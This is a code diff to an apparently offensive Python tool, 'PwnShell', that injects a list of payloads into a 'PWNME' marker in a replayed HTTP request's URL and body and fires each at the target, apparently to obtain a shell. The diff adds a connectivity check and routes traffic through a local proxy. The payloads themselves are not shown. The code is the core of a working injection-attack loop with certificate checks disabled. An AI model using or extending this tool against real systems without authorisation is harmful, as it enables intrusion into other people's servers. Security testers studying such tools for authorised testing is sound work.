@@ -143,15 +143,23 @@ class PwnShell:
         request, post_data = parse_request(self.file)  # Get Headers
         method, resource = get_method_and_resource(self.file)  # Get method and URI
         url = f"{self.secure}://" + request["Host"] + resource
+        request_headers = request
+        POST_data = post_data
+        """Check connection"""
+        try:
+            requests.get(url)
+        except requests.ConnectionError:
+            console.print("[!] Connection Error, please check your network connection\n", style="bold red")
+            exit(1)
         for payload in payloads:
             time.sleep(2)
             if self.connected:
                 break
             self.payload = self.get_url_encoded_payload(payload)
             self.iteration += 1
-            req = request
+            req = request_headers
             self.url = url.replace("PWNME", self.payload)
-            data = post_data.replace("PWNME", self.payload)
+            data = POST_data.replace("PWNME", self.payload)
             console.print(f'[*] Trying payload [{self.iteration}/{len(payloads)}] : {payload[:30]}...', end='\r',
                           style="white")
             for r in req:
@@ -161,9 +169,9 @@ class PwnShell:
             if method.lower() == "post":
                 if post_data:
                     post_data = post_data.replace("PWNME", self.payload)
-                req = requests.post(self.url, headers=req, data=data, verify=False)
+                    requests.post(self.url, headers=req, data=data, verify=False, proxies={"http": "http://127.0.0.1:8080"})
             elif method.lower() == "get":
-                req = requests.get(self.url, headers=req, verify=False, proxies={"http": "http://127.0.0.1:8080"})
+                requests.get(self.url, headers=req, verify=False, proxies={"http": "http://127.0.0.1:8080"})
         exit(1)
 
     def is_valid(self):  # Checking if the ip address is valid
